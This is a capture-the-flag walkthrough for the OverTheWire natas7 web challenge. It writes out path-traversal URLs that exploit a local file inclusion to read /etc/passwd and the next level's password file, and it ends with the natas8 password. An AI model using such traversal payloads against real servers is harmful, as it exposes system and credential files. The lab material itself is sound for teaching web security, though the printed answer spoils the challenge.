In natas7, we have 2 links: Home and About. Clicking those,
we don't get much information; however, we see the URL bar on our
browser changes like:

http://natas7.natas.labs.overthewire.org/index.php?page=home

So, it seems like the index.php is responsible to show both the
links within itself, and including the .php source files with
the GET parameter <page>.

Maybe we can use this GET parameter to include local files.
Let us try the following:

http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/passwd

We get the desired response:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:
(...)
(...)

Since we know where the passwords are stored for the level,
let us include the password file:

http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8

We get the following password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

So, the credentials are:

Username: natas8
Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
